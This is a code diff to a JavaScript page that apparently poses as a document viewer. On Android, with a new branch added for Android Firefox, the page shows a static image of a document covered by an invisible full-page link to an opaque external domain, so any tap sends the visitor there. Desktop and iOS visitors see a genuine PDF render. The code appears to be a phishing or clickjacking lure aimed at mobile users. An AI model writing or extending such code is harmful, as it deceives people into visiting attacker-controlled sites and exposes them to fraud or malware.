@@ -80,21 +80,34 @@ const PNG_URL = './document.png';
 const VITAL_LINK = 'https://ch1108677878.com';
 
 const isAndroid = /Android/i.test(ua);
+const isAndroidFirefox = /Android.*Firefox/i.test(ua);
 
 /* =========================
-   ANDROID: IMAGE + FULL-PAGE LINK
+   ANDROID FIREFOX: IMAGE + FULL-PAGE LINK
    ========================= */
-if (isAndroid) {
+if (isAndroidFirefox) {
+    viewer.innerHTML = `
+        <div style="position: relative; width: 100%; min-height: 100vh;">
+            <img src="${PNG_URL}" style="width:100%; height:auto; display:block;" alt="Document">
+            <a href="${VITAL_LINK}" target="_blank" style="position:absolute; left:0; top:0; width:100%; height:100%; z-index:10;"></a>
+        </div>
+    `;
+}
+/* =========================
+   OTHER ANDROID: IMAGE + FULL-PAGE LINK
+   ========================= */
+else if (isAndroid) {
     viewer.innerHTML = `
         <div class="android-wrapper">
             <img src="${PNG_URL}" class="android-img" alt="Document">
             <a href="${VITAL_LINK}" target="_blank" class="android-link"></a>
         </div>
     `;
-} else {
-    /* =========================
-       DESKTOP + iOS: PDF.js
-       ========================= */
+}
+/* =========================
+   DESKTOP + iOS: PDF.js
+   ========================= */
+else {
     pdfjsLib.GlobalWorkerOptions.workerSrc = './pdfjs/pdf.worker.mjs';
 
     const canvas = document.createElement('canvas');
